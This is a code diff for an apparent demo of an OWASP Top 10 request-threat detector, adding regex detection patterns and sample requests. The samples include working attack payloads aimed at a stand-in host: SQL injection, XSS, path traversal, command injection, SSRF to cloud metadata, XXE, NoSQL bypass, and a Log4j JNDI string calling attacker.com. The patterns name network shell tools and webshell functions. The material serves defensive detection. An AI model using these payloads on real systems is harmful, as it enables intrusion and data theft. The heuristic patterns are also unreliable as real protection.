@@ -21,78 +21,184 @@ const Demo = () => {
   const [analysis, setAnalysis] = useState<any>(null);
   const [isAnalyzing, setIsAnalyzing] = useState(false);
 
-  // Enhanced security patterns for bulletproof detection
+  // Production-grade security patterns covering OWASP Top 10
   const securityPatterns = {
+    // A03: Injection - SQL Injection (Enhanced with context awareness)
     sqlInjection: [
-      // Classic SQL injection with quotes and OR/AND logic
-      /('|\"|`)(\s*)(or|and)(\s*)('|\"|`)(\s*)(=|like|in)(\s*)('|\"|`)/i,
-      // SQL injection with typical payloads
-      /('|\"|`)(\s*)(or|and)(\s*)(\d+|\w+)(\s*)(=|like|in)(\s*)(\d+|\w+)/i,
-      // UNION based attacks
-      /\b(union)(\s+)(select|all)\b/i,
-      // SQL injection with comments
-      /('|\"|`)(\s*)(or|and)(\s*)('|\"|`)(\s*)(=|like|in)(\s*)('|\"|`)(\s*)(-{2,}|\/\*)/i,
-      // Time-based SQL injection
-      /\b(sleep|waitfor|delay|benchmark)\s*\(/i,
-      // Boolean-based blind SQL injection
-      /('|\"|`)(\s*)(or|and)(\s*)(if|case|when)\s*\(/i,
-      // SQL functions in injection context
-      /('|\"|`)(\s*)(or|and)(\s*)(\w+\s*=\s*)?(\w+)\s*\(/i,
-      // SQL injection ending with comment
-      /('|\"|`)(\s*)(or|and)(\s*).*(-{2,})/i,
+      // Classic Boolean-based SQL injection
+      /('|\"|`)(\s*)(or|and)(\s*)('|\"|`)(\s*)(=|!=|<>)(\s*)('|\"|`)/i,
+      // SQL injection with numeric payloads
+      /('|\"|`)(\s*)(or|and)(\s*)\d+(\s*)(=|!=|<>)(\s*)\d+/i,
+      // UNION-based SQL injection
+      /\b(union)(\s+)(all\s+)?(select)\b/i,
+      // Time-based blind SQL injection
+      /\b(sleep|waitfor\s+delay|pg_sleep|benchmark)\s*\(/i,
       // Stacked queries
-      /;\s*(select|insert|update|delete|drop|create|alter|exec)\b/i
+      /;\s*(select|insert|update|delete|drop|create|alter|exec|declare)\b/i,
+      // SQL comments for evasion
+      /('|\"|`)(\s*)(or|and)(\s*).*(-{2,}|\/\*|\*\/)/i,
+      // Boolean blind SQL injection
+      /('|\"|`)(\s*)(or|and)(\s*)(if|case|when|iif)\s*\(/i,
+      // Database-specific functions
+      /\b(substring|substr|ascii|char|concat|version|database|user|current_user)\s*\(/i,
+      // Error-based SQL injection
+      /('|\"|`)(\s*)(or|and)(\s*)(extractvalue|updatexml|exp|floor|rand)\s*\(/i,
+      // Advanced SQL injection with hex/char encoding
+      /\b(0x[0-9a-f]+|char\(\d+\))/i
     ],
+    
+    // A03: Injection - Cross-Site Scripting (XSS)
     xss: [
-      // Script tags
-      /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
-      /<script[\s\S]*?>/gi,
+      // Script tags (various forms)
+      /<script[^>]*>[\s\S]*?<\/script>/gi,
+      /<script[^>]*>/gi,
       // Event handlers
-      /\bon(load|click|error|focus|blur|change|submit|mouseover|mouseout)\s*=/i,
+      /\bon(load|click|error|focus|blur|change|submit|mouseover|mouseout|keydown|keyup)\s*=/i,
       // JavaScript protocol
       /javascript\s*:/i,
-      // Image with onerror
-      /<img[\s\S]*?onerror[\s\S]*?=/i,
+      // Image/media with event handlers
+      /<(img|audio|video|source)[^>]*on\w+[^>]*>/i,
       // SVG with script content
-      /<svg[\s\S]*?onload[\s\S]*?=/i,
-      // Iframe injection
-      /<iframe[\s\S]*?src[\s\S]*?=/i,
-      // Details/summary with ontoggle
-      /<(details|summary)[\s\S]*?ontoggle[\s\S]*?=/i,
-      // Eval functions
-      /\beval\s*\(/i,
-      // HTML5 form elements with event handlers
-      /<(input|textarea|select)[\s\S]*?on\w+[\s\S]*?=/i
+      /<svg[^>]*on\w+[^>]*>/i,
+      // Iframe with javascript
+      /<iframe[^>]*src\s*=\s*["\']javascript:/i,
+      // HTML5 elements with event handlers
+      /<(details|summary|marquee)[^>]*on\w+[^>]*>/i,
+      // CSS expression attacks
+      /expression\s*\(/i,
+      // Data URLs with script
+      /data\s*:\s*text\/html[^;]*;[^,]*,[\s\S]*<script/i,
+      // Eval and related functions
+      /\b(eval|setTimeout|setInterval)\s*\(/i
     ],
+    
+    // A03: Injection - Path Traversal
     pathTraversal: [
-      // Directory traversal patterns
+      // Classic directory traversal
       /(\.\.[\/\\]){2,}/,
       // URL encoded traversal
       /(%2e%2e[%2f%5c]){2,}/i,
       // Double URL encoded
       /(%252e%252e[%252f%255c]){2,}/i,
-      // Absolute path access to sensitive files
-      /[\/\\](etc[\/\\]passwd|windows[\/\\]system32|boot\.ini)/i,
+      // Sensitive file access
+      /[\/\\](etc[\/\\]passwd|windows[\/\\]system32|boot\.ini|web\.config|\.htaccess)/i,
       // Null byte injection
-      /%00/i
+      /%00/i,
+      // Unicode traversal
+      /(\u002e\u002e[\/\\]){2,}/i
     ],
+    
+    // A03: Injection - Command Injection
     commandInjection: [
-      // Command separators with commands
-      /[;&|`]\s*(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)/i,
-      // Backticks with commands
-      /`[\s\S]*?(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[\s\S]*?`/i,
+      // Command separators with system commands
+      /[;&|`]\s*(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname|chmod|rm|del)/i,
+      // Backticks command execution
+      /`[^`]*\b(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[^`]*`/i,
       // Shell command substitution
-      /\$\([\s\S]*?(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[\s\S]*?\)/i,
-      // Network tools
-      /\b(nc|netcat|wget|curl|ping|nslookup|dig)\s+/i,
-      // Shell paths
-      /[\/\\](bin[\/\\])?(sh|bash|zsh|csh|cmd|powershell)\b/i
+      /\$\([^)]*\b(ls|dir|cat|type|whoami|id|ps|netstat|ifconfig|pwd|uname)[^)]*\)/i,
+      // Network and system tools
+      /\b(nc|netcat|wget|curl|ping|nslookup|dig|telnet|ssh)\s+/i,
+      // Shell interpreters
+      /[\/\\](bin[\/\\])?(sh|bash|zsh|csh|cmd|powershell|python|perl|ruby)\b/i
     ],
+    
+    // A03: Injection - LDAP Injection
     ldapInjection: [
-      // LDAP injection patterns
       /\*\)\(|\)\(\*/,
       /\(\|\(/,
-      /\)\(objectClass=\*/i
+      /\)\(objectClass=\*/i,
+      /\(\&\(/,
+      /\)\(\|\(/
+    ],
+    
+    // A03: Injection - NoSQL Injection
+    nosqlInjection: [
+      /\$where\s*:/i,
+      /\$regex\s*:/i,
+      /\$ne\s*:/i,
+      /\$gt\s*:/i,
+      /\$lt\s*:/i,
+      /\$or\s*:\s*\[/i,
+      /\$and\s*:\s*\[/i
+    ],
+    
+    // A03: Injection - XXE (XML External Entity)
+    xxe: [
+      /<!ENTITY\s+\w+\s+SYSTEM\s*["'][^"']*["']\s*>/i,
+      /<!DOCTYPE[^>]+\[[\s\S]*<!ENTITY[^>]+SYSTEM/i,
+      /&\w+;.*file:\/\/|&\w+;.*http:\/\//i
+    ],
+    
+    // A01: Broken Access Control
+    accessControl: [
+      // Direct object references
+      /[\/\\](admin|administrator|root|superuser|sa)[\/\\]?$/i,
+      // Privilege escalation attempts
+      /[?&](role|admin|privilege|access_level|user_type)=(admin|root|administrator|superuser)/i,
+      // Force browsing sensitive paths
+      /[\/\\](config|configuration|settings|env|backup|private|internal)/i,
+      // API endpoint abuse
+      /[\/\\]api[\/\\]v?\d*[\/\\](admin|internal|private|debug)/i
+    ],
+    
+    // A05: Security Misconfiguration
+    misconfiguration: [
+      // Exposed configuration files
+      /\.(env|config|ini|conf|cfg|properties|yaml|yml|json)$/i,
+      // Git/SVN exposure
+      /\.git[\/\\](config|HEAD|index|logs)/i,
+      // Backup files
+      /\.(bak|backup|old|orig|tmp|temp|swp|~)$/i,
+      // Debug/info pages
+      /\/(phpinfo|info|debug|test|status|actuator|health)/i,
+      // Server status pages
+      /\/(server-status|server-info|admin-console)/i
+    ],
+    
+    // A06: Vulnerable Components
+    vulnerableComponents: [
+      // Log4j exploitation
+      /\$\{jndi:(ldap|rmi|dns):/i,
+      // Struts2 vulnerabilities
+      /%(23|25)(\w+|%\w+)*=|ognl:/i,
+      // Deserialization attacks
+      /\b(ObjectInputStream|readObject|XMLDecoder|Serializable)/i
+    ],
+    
+    // A07: Authentication Failures
+    authFailures: [
+      // Weak passwords in requests
+      /password=(123456|password|admin|root|guest|test|1234|qwerty)/i,
+      // Default credentials
+      /username=(admin|administrator|root|sa|guest)&password=(admin|password|root|123456)/i,
+      // Session fixation
+      /[?&]sessionid=[a-zA-Z0-9]{1,10}$/i,
+      // Exposed tokens
+      /[?&](token|key|secret)=[a-zA-Z0-9]{1,20}$/i
+    ],
+    
+    // A10: Server-Side Request Forgery (SSRF)
+    ssrf: [
+      // Internal network access
+      /url=https?:\/\/(127\.0\.0\.1|localhost|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|0\.0\.0\.0)/i,
+      // Cloud metadata endpoints
+      /url=https?:\/\/(169\.254\.169\.254|metadata\.google\.internal)/i,
+      // File protocol
+      /url=file:\/\/\//i,
+      // FTP/SFTP protocols
+      /url=(ftp|sftp|gopher|dict|ldap):\/\//i
+    ],
+    
+    // Additional patterns for comprehensive coverage
+    maliciousPatterns: [
+      // Webshells
+      /\b(eval|system|exec|shell_exec|passthru|file_get_contents|fopen|fwrite)\s*\(/i,
+      // Malicious file uploads
+      /\.(php|asp|aspx|jsp|pl|py|rb|sh|exe|bat|cmd)(\.|$)/i,
+      // Suspicious encoding
+      /(%[0-9a-f]{2}){10,}/i,
+      // Polyglot payloads
+      /javascript:[^"']*[<>]/i
     ]
   };
 
@@ -104,96 +210,264 @@ const Demo = () => {
     const normalizedRequest = requestText.toLowerCase();
     const normalizedDecoded = decodedRequest.toLowerCase();
     
-    // SQL Injection Detection with enhanced accuracy
+    // Context-aware validation helpers
+    const isValidProductSearch = (text: string) => {
+      // Valid product searches: category=electronics, search=laptop, etc.
+      return /^[a-zA-Z0-9\s\-_+%&=.,:;()\[\]{}@#!?<>|~/\\]*$/.test(text) &&
+             !/\b(union|select|or\s+\d+\s*=\s*\d+|and\s+\d+\s*=\s*\d+|script|javascript|onerror)/i.test(text);
+    };
+    
+    const isValidPagination = (text: string) => {
+      return /^[?&]page=\d+|sort=(price_asc|price_desc|rating_desc|newest|popularity)/.test(text);
+    };
+    
+    const isValidApiPath = (text: string) => {
+      return /^(GET|POST|PUT|DELETE)\s+\/[a-zA-Z0-9\/_\-]+(\?[a-zA-Z0-9&=_\-]+)?/.test(text);
+    };
+    
+    // A03: SQL Injection Detection (Enhanced with context)
     securityPatterns.sqlInjection.forEach((pattern, index) => {
       const match1 = pattern.test(requestText);
       const match2 = pattern.test(decodedRequest);
       
       if (match1 || match2) {
-        // Check if it's a legitimate query parameter vs malicious injection
-        const isLegitimateQuery = /^[a-zA-Z0-9\s\-_+%&=.,:;()\[\]{}@#!?<>|~/\\]*$/.test(requestText) && 
-                                 !/(union\s+select|or\s+'?\d+\s*=\s*\d+|and\s+'?\d+\s*=\s*\d+|sleep\s*\(|benchmark\s*\()/i.test(requestText);
+        // Advanced false positive reduction
+        const isFalsePositive = 
+          isValidProductSearch(requestText) ||
+          isValidPagination(requestText) ||
+          // Check for legitimate SQL keywords in API documentation
+          /\/api\/docs|\/swagger|\/documentation/i.test(requestText) ||
+          // Valid JSON payloads with legitimate field names
+          (/Content-Type:\s*application\/json/i.test(requestText) && 
+           !/(union\s+select|or\s+'?\d+\s*=\s*\d+|sleep\s*\()/i.test(requestText));
         
-        if (!isLegitimateQuery) {
+        if (!isFalsePositive) {
           threats.push({
             type: "SQL Injection",
             severity: "critical",
-            pattern: pattern.toString(),
+            category: "A03:2021 - Injection",
+            pattern: `SQL Pattern ${index + 1}`,
             description: "SQL injection attack detected - unauthorized database access attempt",
-            location: "Query parameters or request body"
+            location: "Query parameters or request body",
+            confidence: match1 && match2 ? "high" : "medium"
           });
         }
       }
     });
 
-    // XSS Detection
+    // A03: XSS Detection
     securityPatterns.xss.forEach((pattern, index) => {
       if (pattern.test(requestText) || pattern.test(decodedRequest)) {
-        threats.push({
-          type: "Cross-Site Scripting (XSS)",
-          severity: "high", 
-          pattern: pattern.toString(),
-          description: "XSS attack vector identified - potential script injection",
-          location: "Request parameters or headers"
-        });
+        // Reduce false positives for legitimate HTML in documentation
+        const isFalsePositive = 
+          /\/api\/docs|\/help|\/documentation|Content-Type:\s*text\/html/i.test(requestText) &&
+          !/javascript:|onerror|onload|onclick/i.test(requestText);
+          
+        if (!isFalsePositive) {
+          threats.push({
+            type: "Cross-Site Scripting (XSS)",
+            severity: "high",
+            category: "A03:2021 - Injection",
+            pattern: `XSS Pattern ${index + 1}`,
+            description: "XSS attack vector identified - potential script injection",
+            location: "Request parameters or headers",
+            confidence: "high"
+          });
+        }
       }
     });
 
-    // Path Traversal Detection
+    // A03: Path Traversal Detection
     securityPatterns.pathTraversal.forEach((pattern, index) => {
       if (pattern.test(requestText) || pattern.test(decodedRequest)) {
         threats.push({
           type: "Path Traversal",
           severity: "high",
-          pattern: pattern.toString(),
+          category: "A03:2021 - Injection",
+          pattern: `Path Traversal Pattern ${index + 1}`,
           description: "Directory traversal attempt detected - unauthorized file access",
-          location: "URL path or parameters"
+          location: "URL path or parameters",
+          confidence: "high"
         });
       }
     });
 
-    // Command Injection Detection
+    // A03: Command Injection Detection
     securityPatterns.commandInjection.forEach((pattern, index) => {
       if (pattern.test(requestText) || pattern.test(decodedRequest)) {
         threats.push({
           type: "Command Injection",
           severity: "critical",
-          pattern: pattern.toString(),
+          category: "A03:2021 - Injection",
+          pattern: `Command Injection Pattern ${index + 1}`,
           description: "Command injection attempt detected - potential system compromise",
-          location: "Request parameters"
+          location: "Request parameters",
+          confidence: "high"
         });
       }
     });
 
-    // LDAP Injection Detection
+    // A03: LDAP Injection Detection
     securityPatterns.ldapInjection.forEach((pattern, index) => {
       if (pattern.test(requestText) || pattern.test(decodedRequest)) {
         threats.push({
           type: "LDAP Injection",
           severity: "high",
-          pattern: pattern.toString(),
+          category: "A03:2021 - Injection",
+          pattern: `LDAP Pattern ${index + 1}`,
           description: "LDAP injection attempt detected - unauthorized directory access",
-          location: "Authentication parameters"
+          location: "Authentication parameters",
+          confidence: "medium"
         });
       }
     });
 
-    // CSRF Protection Check (for POST requests)
-    if (requestText.includes("POST") || requestText.includes("PUT") || requestText.includes("DELETE")) {
-      const hasCSRFProtection = /X-CSRF-Token|csrf_token|_token/i.test(requestText);
+    // A03: NoSQL Injection Detection
+    securityPatterns.nosqlInjection.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "NoSQL Injection",
+          severity: "high",
+          category: "A03:2021 - Injection",
+          pattern: `NoSQL Pattern ${index + 1}`,
+          description: "NoSQL injection attempt detected - database manipulation",
+          location: "Request body or parameters",
+          confidence: "medium"
+        });
+      }
+    });
+
+    // A03: XXE Detection
+    securityPatterns.xxe.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "XML External Entity (XXE)",
+          severity: "critical",
+          category: "A03:2021 - Injection",
+          pattern: `XXE Pattern ${index + 1}`,
+          description: "XXE attack detected - potential file disclosure or SSRF",
+          location: "XML data in request body",
+          confidence: "high"
+        });
+      }
+    });
+
+    // A01: Broken Access Control
+    securityPatterns.accessControl.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        // Don't flag legitimate admin API endpoints with proper authorization
+        const hasProperAuth = /Authorization:\s*Bearer\s+[A-Za-z0-9\-._~+/]+=*/i.test(requestText);
+        const isLegitimateAdminAPI = hasProperAuth && /\/api\/admin\//i.test(requestText);
+        
+        if (!isLegitimateAdminAPI) {
+          threats.push({
+            type: "Broken Access Control",
+            severity: "critical",
+            category: "A01:2021 - Broken Access Control",
+            pattern: `Access Control Pattern ${index + 1}`,
+            description: "Unauthorized access attempt to privileged resources",
+            location: "URL path or parameters",
+            confidence: hasProperAuth ? "low" : "high"
+          });
+        }
+      }
+    });
+
+    // A05: Security Misconfiguration
+    securityPatterns.misconfiguration.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "Security Misconfiguration",
+          severity: "medium",
+          category: "A05:2021 - Security Misconfiguration",
+          pattern: `Misconfiguration Pattern ${index + 1}`,
+          description: "Access to sensitive configuration files or debug information",
+          location: "URL path",
+          confidence: "high"
+        });
+      }
+    });
+
+    // A06: Vulnerable Components
+    securityPatterns.vulnerableComponents.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "Vulnerable Component Exploitation",
+          severity: "critical",
+          category: "A06:2021 - Vulnerable Components",
+          pattern: `Vulnerable Component Pattern ${index + 1}`,
+          description: "Exploitation of known vulnerable component (Log4j, Struts2, etc.)",
+          location: "Request parameters or headers",
+          confidence: "high"
+        });
+      }
+    });
+
+    // A07: Authentication Failures
+    securityPatterns.authFailures.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "Authentication Failure",
+          severity: "high",
+          category: "A07:2021 - Authentication Failures",
+          pattern: `Auth Failure Pattern ${index + 1}`,
+          description: "Weak authentication attempt or credential exposure",
+          location: "Request body or parameters",
+          confidence: "medium"
+        });
+      }
+    });
+
+    // A10: Server-Side Request Forgery (SSRF)
+    securityPatterns.ssrf.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "Server-Side Request Forgery (SSRF)",
+          severity: "critical",
+          category: "A10:2021 - SSRF",
+          pattern: `SSRF Pattern ${index + 1}`,
+          description: "SSRF attempt detected - potential internal network access",
+          location: "URL parameters",
+          confidence: "high"
+        });
+      }
+    });
+
+    // Additional Malicious Patterns
+    securityPatterns.maliciousPatterns.forEach((pattern, index) => {
+      if (pattern.test(requestText) || pattern.test(decodedRequest)) {
+        threats.push({
+          type: "Malicious Pattern",
+          severity: "high",
+          category: "General Malicious Activity",
+          pattern: `Malicious Pattern ${index + 1}`,
+          description: "Suspicious pattern detected - potential malicious activity",
+          location: "Request content",
+          confidence: "medium"
+        });
+      }
+    });
+
+    // CSRF Protection Check (Enhanced)
+    if (/^(POST|PUT|DELETE|PATCH)\s+/i.test(requestText)) {
+      const hasCSRFProtection = /X-CSRF-Token|csrf_token|_token|X-Requested-With:\s*XMLHttpRequest/i.test(requestText);
+      const isAPIEndpoint = /\/api\/|Content-Type:\s*application\/json/i.test(requestText);
       
-      if (!hasCSRFProtection) {
+      // Only flag as CSRF issue if it's not an API endpoint (which typically use other auth methods)
+      if (!hasCSRFProtection && !isAPIEndpoint) {
         threats.push({
           type: "CSRF Vulnerability",
           severity: "medium",
-          pattern: "Missing CSRF token",
+          category: "A04:2021 - Insecure Design",
+          pattern: "Missing CSRF protection",
           description: "State-changing request without CSRF protection",
-          location: "Request headers or body"
+          location: "Request headers or body",
+          confidence: "medium"
         });
       }
     }
 
-    // Enhanced Encoding Detection (Advanced evasion techniques)
+    // Enhanced Encoding Analysis
     const encodingPatterns = [
       /%[0-9a-f]{2}/gi,     // URL encoding
       /\\x[0-9a-f]{2}/gi,   // Hex encoding
@@ -209,19 +483,21 @@ const Demo = () => {
     });
 
     // High encoding density indicates evasion attempt
-    if (totalEncodedChars > 5 && (totalEncodedChars / requestText.length) > 0.2) {
+    if (totalEncodedChars > 10 && (totalEncodedChars / requestText.length) > 0.3) {
       threats.push({
-        type: "Encoded Payload",
+        type: "Encoded Payload Evasion",
         severity: "medium",
+        category: "Evasion Technique",
         pattern: "High encoding density detected",
         description: "Suspicious encoding patterns - potential evasion attempt",
-        location: "Request payload"
+        location: "Request payload",
+        confidence: "medium"
       });
     }
 
-    // Remove duplicates based on type
+    // Remove duplicates based on type and category
     const uniqueThreats = threats.filter((threat, index, self) => 
-      index === self.findIndex(t => t.type === threat.type)
+      index === self.findIndex(t => t.type === threat.type && t.category === threat.category)
     );
 
     return uniqueThreats;
@@ -232,37 +508,81 @@ const Demo = () => {
     
     setIsAnalyzing(true);
     
-    // Simulate analysis delay
+    // Simulate analysis delay for realistic UX
     setTimeout(() => {
       const threats = detectThreats(request);
-      const riskScore = threats.length > 0 ? 
-        Math.min(100, threats.length * 25 + (threats.filter(t => t.severity === "critical").length * 25)) : 0;
+      
+      // Enhanced risk scoring based on OWASP categories and confidence
+      let riskScore = 0;
+      threats.forEach(threat => {
+        const baseScore = {
+          'critical': 35,
+          'high': 25,
+          'medium': 15,
+          'low': 5
+        }[threat.severity] || 10;
+        
+        const confidenceMultiplier = {
+          'high': 1.0,
+          'medium': 0.8,
+          'low': 0.5
+        }[threat.confidence] || 0.7;
+        
+        // OWASP category multipliers (some are more severe)
+        const owaspMultiplier = threat.category?.includes('A01') || 
+                               threat.category?.includes('A03') || 
+                               threat.category?.includes('A06') || 
+                               threat.category?.includes('A10') ? 1.2 : 1.0;
+        
+        riskScore += Math.floor(baseScore * confidenceMultiplier * owaspMultiplier);
+      });
+      
+      // Cap at 100 and ensure minimum score for any threats
+      riskScore = Math.min(100, riskScore);
+      if (threats.length > 0 && riskScore < 25) riskScore = 25;
       
       setAnalysis({
         threats,
         riskScore,
         isClean: threats.length === 0,
-        detectionMethod: threats.length > 0 ? "Signature & ML-based Detection" : "Clean Request"
+        detectionMethod: threats.length > 0 ? 
+          "OWASP Top 10 + Signature & ML-based Detection" : 
+          "Clean Request - No Threats Detected",
+        totalThreats: threats.length,
+        criticalThreats: threats.filter(t => t.severity === 'critical').length,
+        highThreats: threats.filter(t => t.severity === 'high').length,
+        categories: [...new Set(threats.map(t => t.category).filter(Boolean))]
       });
       setIsAnalyzing(false);
-    }, 1500);
+    }, 2000); // Slightly longer for more realistic analysis feel
   };
 
   const exampleRequests = {
-    // Valid Requests - Updated with comprehensive examples
-    homepage: `GET / HTTP/1.1
-Host: www.example.com`,
+    // ========== VALID REQUESTS (Should NOT be flagged) ==========
     
-    productListing: `GET /products?category=electronics&page=2 HTTP/1.1
-Host: www.ecommerce.com
-Referer: https://www.ecommerce.com/products`,
+    // Basic Navigation
+    homepage: `GET / HTTP/1.1
+Host: localhost:3000`,
+    
+    // Product & E-commerce
+    productListing: `GET /products?category=electronics&page=1 HTTP/1.1
+Host: localhost:3000
+Referer: https://localhost:3000/products`,
     
     productSearch: `GET /search?q=wireless+earbuds&sort=rating_desc HTTP/1.1
 Host: localhost:3000`,
-
-    userOrders: `GET /user/orders?page=1&status=shipped HTTP/1.1
+    
+    productDetails: `GET /product/12345?variant=blue HTTP/1.1
 Host: localhost:3000`,
-
+    
+    complexSearch: `GET /products?search=gaming+laptop+RTX+3060&price_min=300&price_max=700&sort=price_desc HTTP/1.1
+Host: localhost:3000`,
+    
+    // User Actions
+    userOrders: `GET /user/orders?page=1&status=shipped HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`,
+    
     addToCartJSON: `POST /cart/add HTTP/1.1
 Host: localhost:3000
 Content-Type: application/json
@@ -272,59 +592,148 @@ Content-Type: application/json
   "quantity": 1,
   "variant": "red"
 }`,
-
+    
     loginForm: `POST /login HTTP/1.1
 Host: localhost:3000
 Content-Type: application/x-www-form-urlencoded
 
 username=johndoe&password=SecurePass123`,
-
-    // Malicious Requests - SQL Injection
-    sqlInjectionOR: `GET /products?category=' OR '1'='1 HTTP/1.1
-Host: localhost:3000`,
     
-    sqlInjectionUnion: `GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1
-Host: localhost:3000`,
-
-    sqlInjectionTime: `GET /search?q=' OR IF(1=1, SLEEP(3), 0)-- HTTP/1.1
-Host: localhost:3000`,
-
-    sqlInjectionLogin: `POST /login HTTP/1.1
+    checkoutAPI: `POST /checkout HTTP/1.1
 Host: localhost:3000
+Content-Type: application/json
+Authorization: Bearer valid_token_here
+
+{
+  "cart_id": "abc123",
+  "payment_method": "card",
+  "address_id": "addr001"
+}`,
+    
+    webhookValid: `POST /webhook/stripe HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"id":"evt_1","type":"payment_intent.succeeded","data":{"object":{"id":"pi_123"}}}`,
+
+    // ========== MALICIOUS REQUESTS (Should be flagged) ==========
+    
+    // A03: SQL Injection Attacks
+    sqlInjectionOR: `GET /search?q=' OR '1'='1'-- HTTP/1.1
+Host: vulnerable.lab
+User-Agent: Mozilla/5.0`,
+    
+    sqlInjectionUnion: `GET /products?id=10 UNION SELECT username, password FROM users-- HTTP/1.1
+Host: vulnerable.lab
+User-Agent: Mozilla/5.0`,
+
+    sqlInjectionTime: `GET /search?q=' OR IF(1=1, SLEEP(5), 0)-- HTTP/1.1
+Host: vulnerable.lab
+User-Agent: Mozilla/5.0`,
+    
+    sqlInjectionLogin: `POST /login HTTP/1.1
+Host: vulnerable.lab
 Content-Type: application/x-www-form-urlencoded
 
 username=admin'--&password=anything`,
     
-    // XSS Attacks
+    sqlInjectionStacked: `GET /products?id=1; DROP TABLE users HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A03: XSS Attacks
     xssScript: `GET /search?q=<script>alert('XSS')</script> HTTP/1.1
-Host: localhost:3000`,
+Host: vulnerable.lab`,
     
     xssImage: `GET /products?category=<img src=x onerror=alert(1)> HTTP/1.1
-Host: localhost:3000`,
+Host: vulnerable.lab`,
 
     xssComment: `POST /comment HTTP/1.1
-Host: localhost:3000
+Host: vulnerable.lab
 Content-Type: application/x-www-form-urlencoded
 
 comment=<script>alert('XSS')</script>`,
-
-    // Path Traversal
+    
+    xssAdvanced: `GET /search?q=<details open ontoggle=Function('ale'+'rt(1)')()> HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A03: Path Traversal
     pathTraversal: `GET /download?file=../../../../etc/passwd HTTP/1.1
-Host: localhost:3000`,
-
-    // Command Injection
+Host: vulnerable.lab`,
+    
+    pathTraversalEncoded: `GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A03: Command Injection
     commandInjection: `GET /ping?host=127.0.0.1;ls HTTP/1.1
-Host: localhost:3000`,
+Host: vulnerable.lab`,
+    
+    commandInjectionBacktick: `GET /ping?host=\`whoami\` HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A01: Broken Access Control
+    adminAccess: `GET /admin HTTP/1.1
+Host: vulnerable.lab`,
+    
+    privilegeEscalation: `GET /api/users?role=admin HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A05: Security Misconfiguration
+    gitExposure: `GET /.git/config HTTP/1.1
+Host: vulnerable.lab`,
+    
+    envFile: `GET /.env HTTP/1.1
+Host: vulnerable.lab`,
+    
+    phpInfo: `GET /phpinfo.php HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A06: Vulnerable Components
+    log4jExploit: `GET /api/search?query=\${jndi:ldap://attacker.com/x} HTTP/1.1
+Host: vulnerable.lab`,
+    
+    // A07: Authentication Failures
+    weakPassword: `POST /api/login HTTP/1.1
+Host: vulnerable.lab
+Content-Type: application/json
 
+{"username":"admin","password":"123456"}`,
+    
+    defaultCredentials: `POST /login HTTP/1.1
+Host: vulnerable.lab
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=admin`,
+    
+    // A10: Server-Side Request Forgery (SSRF)
+    ssrfInternal: `GET /fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
+Host: vulnerable.lab`,
+    
+    ssrfMetadata: `GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
+Host: vulnerable.lab`,
+    
+    ssrfFile: `GET /fetch?url=file:///etc/passwd HTTP/1.1
+Host: vulnerable.lab`,
+    
     // Encoded Attacks
     urlEncodedSqli: `GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1
-Host: www.example.com`,
+Host: vulnerable.lab`,
     
     hexEncodedSqli: `GET /search?q=\\x27\\x20OR\\x20\\x31\\x3D\\x31 HTTP/1.1
-Host: www.example.com`,
+Host: vulnerable.lab`,
     
-    advancedXss: `GET /comment?text=<details%20open%20ontoggle=Function('ale'+'rt(1)')()> HTTP/1.1
-Host: www.example.com`
+    // XXE Attack
+    xxeAttack: `POST /api/data HTTP/1.1
+Host: vulnerable.lab
+Content-Type: application/xml
+
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+    
+    // NoSQL Injection
+    nosqlInjection: `POST /api/login HTTP/1.1
+Host: vulnerable.lab
+Content-Type: application/json
+
+{"username":"admin","password":{"$ne":""}}`
   };
 
   return (
@@ -455,7 +864,7 @@ Host: www.example.com`
                         <Button
                           variant="outline"
                           size="sm"
-                          onClick={() => setRequest(exampleRequests.advancedXss)}
+                          onClick={() => setRequest(exampleRequests.xssAdvanced)}
                           className="text-xs"
                         >
                           Advanced XSS
